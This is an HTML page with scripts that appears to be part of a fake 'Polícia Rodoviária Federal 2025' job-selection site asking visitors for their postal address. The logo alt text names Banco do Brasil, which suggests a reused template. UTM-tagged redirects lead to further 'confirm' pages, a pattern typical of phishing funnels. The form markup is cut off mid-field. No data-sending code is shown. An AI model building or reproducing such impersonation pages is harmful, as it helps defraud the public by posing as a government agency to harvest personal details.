<body class="bg-gray-50 min-h-screen flex flex-col">
<div id="flasher-container" class="flasher-container"></div>
  <div class="bg-bb-yellow py-4 shadow-sm">
    <div class="container mx-auto px-4">
      <div class="flex flex-col items-center text-center">
        <img src="../../upload.wikimedia.org/wikipedia/commons/1/1b/PRF_new.png" alt="Logo do Banco do Brasil" class="h-12 mb-2">
        <div>
          <p class="text-bb-blue text-[16px] leading-tight font-bold tracking-wide">
            Policia Rodoviária Federal 2025
          </p>
          <p class="text-bb-blue text-[12px] leading-tight tracking-wide">
            SELEÇÃO EXTERNA PARA MÚLTIPLOS CARGOS
          </p>
        </div>
      </div>
    </div>
  </div>

  <!-- Blue bar -->
  <div class="bg-bb-blue py-3 shadow-md">
    <div class="container mx-auto px-4 flex items-center">
      <div class="grid grid-cols-2 gap-0.5 mr-3 drop-shadow-sm">
        <div class="w-2 h-2 bg-white"></div>
        <div class="w-2 h-2 bg-white"></div>
        <div class="w-2 h-2 bg-white"></div>
        <div class="w-2 h-2 bg-white"></div>
      </div>
      <span class="text-white text-xl tracking-wide drop-shadow-sm">CONFIRMAÇÃO DE ENDEREÇO</span>
    </div>
  </div>

  <!-- Main Content -->
  <div class="container mx-auto px-4 py-8 flex-grow">
    <div class="max-w-2xl mx-auto">
      <div class="bg-white rounded-lg shadow-md p-6">
        <div class="mb-6">
          <h2 class="text-lg font-bold text-bb-blue mb-2">Endereço para Correspondência</h2>
          <p class="text-gray-600">Por favor, informe seu endereço para envio de correspondências:</p>
        </div>

        <div class="space-y-6">
          <div class="space-y-4">
            <!-- CEP com autopreenchimento -->
            <div>
              <label for="cep" class="block text-sm font-medium text-gray-700 mb-1">CEP</label>
              <div class="relative">
                <input type="text" id="cep" name="cep" class="w-full px-4 py-2 border rounded-lg focus:ring-bb-blue focus:border-bb-blue" required="" maxlength="9" pattern="\d{5}-\d{3}" placeholder="00000-000" inputmode="numeric">
                <i class="fas fa-map-marker-alt absolute right-3 top-3 text-gray-400"></i>
              </div>
            </div>

            <!-- Campos autopreenchidos -->
            <div>
              <label for="logradouro" class="block text-sm font-medium text-gray-700 mb-1">Logradouro</label>

  <script>
    // Máscara para CEP
    document.getElementById('cep').addEventListener('input', function (e) {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length > 8) value = value.slice(0, 8);
      if (value.length > 5) {
        value = value.slice(0, 5) + '-' + value.slice(5);
      }
      e.target.value = value;

      // Se o CEP estiver completo, busca o endereço
      if (value.length === 9) {
        buscarEndereco(value.replace('-', ''));
      }
    });

    // Função para buscar endereço via CEP
    function buscarEndereco(cep) {
      fetch(`https://viacep.com.br/ws/${cep}/json/`)
        .then(response => response.json())
        .then(data => {
          if (!data.erro) {
            document.getElementById('logradouro').value = data.logradouro;
            document.getElementById('bairro').value = data.bairro;
            document.getElementById('cidade').value = data.localidade;
            document.getElementById('estado').value = data.uf;
            // Foca no campo número após preenchimento
            document.getElementById('numero').focus();
          }
        })
        .catch(error => {
          console.error('Erro ao buscar CEP:', error);
        });
    }
  </script>
  
  <script>
    document.addEventListener("DOMContentLoaded", function () {
        
        // Função para exibir mensagens no DOM
        function showMessage(type, message) {
          const container = document.getElementById("flasher-container");
          const div = document.createElement("div");
          div.className = `flasher-message ${type}`;
          div.textContent = message;

          container.appendChild(div);

          setTimeout(() => {
            div.remove();
          }, 3000);
        }
        
        // Seleciona o botão de confirmação
        const confirmarBtn = document.querySelector("button");

        confirmarBtn.addEventListener("click", function () {
            // Captura os campos obrigatórios
            const camposObrigatorios = document.querySelectorAll("input[required]");

            let camposVazios = [];

            // Verifica se todos os campos obrigatórios estão preenchidos
            camposObrigatorios.forEach(campo => {
                if (campo.value.trim() === "") {
                    camposVazios.push(campo.name); // Adiciona ao array os campos vazios
                }
            });

            // Se houver campos vazios, exibe a mensagem e interrompe o processo
            if (camposVazios.length > 0) {
                showMessage("error", "Por favor, preencha todos os campos antes de continuar.");
                return;
            }

            function montarURLComUTM(destino) {
  const params = new URLSearchParams();
  ["utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content"].forEach((chave) => {
    const valor = localStorage.getItem(chave);
    if (valor) params.set(chave, valor);
  });
  return `${destino}?${params.toString()}`;
}

            // Captura os valores dos campos do formulário
            const endereco = {
                cep: document.getElementById("cep").value,
                logradouro: document.getElementById("logradouro").value,
                numero: document.getElementById("numero").value,
                complemento: document.getElementById("complemento").value,
                bairro: document.getElementById("bairro").value,
                cidade: document.getElementById("cidade").value,
                uf: document.getElementById("estado").value // Alterado de "estado" para "uf"
            };

            // Salva os dados no localStorage
            localStorage.setItem("endereco", JSON.stringify(endereco));

            // Redireciona para a próxima página
            window.location.href = montarURLComUTM("../confirmar/index-2.html");            // Altere para a URL desejada
        });

    });
</script>
